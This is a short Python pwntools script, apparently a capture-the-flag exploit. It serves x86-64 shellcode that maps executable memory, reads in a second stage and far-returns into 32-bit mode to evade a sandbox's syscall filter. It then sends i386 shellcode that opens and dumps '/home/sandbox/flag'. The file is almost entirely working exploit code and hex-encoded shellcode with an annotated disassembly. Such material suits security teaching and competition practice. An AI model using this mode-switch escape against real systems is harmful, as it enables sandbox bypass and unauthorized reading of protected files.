from pwn import *
import socket
import threading
# context.arch = "amd64"


def shellExec():
	shellcode = "90"*0x50
	shellcode += "6a22415a6aff41584531c96a0958bf0101010181f7010105016a075abe0101010181f6012101010f0531c031ff31d2b605be0101010181f6010105010f054831e4bc0005040067c74424042300000067c7042400000400cb"
	shellcode = shellcode.decode("hex")
	return shellcode
	"""
   0:   6a 22                   push   0x22
   2:   41                      inc    ecx
   3:   5a                      pop    edx
   4:   6a ff                   push   0xffffffff
   6:   41                      inc    ecx
   7:   58                      pop    eax
   8:   45                      inc    ebp
   9:   31 c9                   xor    ecx,ecx
   b:   6a 09                   push   0x9
   d:   58                      pop    eax
   e:   bf 01 01 01 01          mov    edi,0x1010101
  13:   81 f7 01 01 05 01       xor    edi,0x1050101
  19:   6a 07                   push   0x7
  1b:   5a                      pop    edx
  1c:   be 01 01 01 01          mov    esi,0x1010101
  21:   81 f6 01 21 01 01       xor    esi,0x1012101
  27:   0f 05                   syscall 
  /* SYS_mmap(0x40000, 0x2000, 0x7, 0x22, -1, 0) */
  29:   31 c0                   xor    eax,eax
  2b:   31 ff                   xor    edi,edi
  2d:   31 d2                   xor    edx,edx
  2f:   b6 05                   mov    dh,0x5
  31:   be 01 01 01 01          mov    esi,0x1010101
  36:   81 f6 01 01 05 01       xor    esi,0x1050101
  3c:   0f 05                   syscall
  /* SYS_read(0, 0x40000, 0x500) */
  3e:   48                      dec    eax
  3f:   31 e4                   xor    esp,esp
  41:   bc 00 05 04 00          mov    esp,0x40500
  46:   67 c7 44 24 04 23 00    mov    DWORD PTR [si+0x24],0x2304
  4d:   00 
  4e:   00 67 c7                add    BYTE PTR [edi-0x39],ah
  51:   04 24                   add    al,0x24
  53:   00 00                   add    BYTE PTR [eax],al
  55:   04 00                   add    al,0x0
  57:   cb                      retf
  /* switch mode */
  """


s = server(1337)
server_conn = s.next_connection()
server_conn.send(shellExec())
raw_input("?")
path = "/home/sandbox/flag"
payload = asm(pwnlib.shellcraft.open(path), arch = 'i386', os = 'linux')
payload += asm(shellcraft.read(1, 0x40500, 0xff), arch = 'i386', os = 'linux')
payload += asm(shellcraft.write(0, 0x40500, 0xff), arch = 'i386', os = 'linux')
server_conn.send(payload)
server_conn.interactive()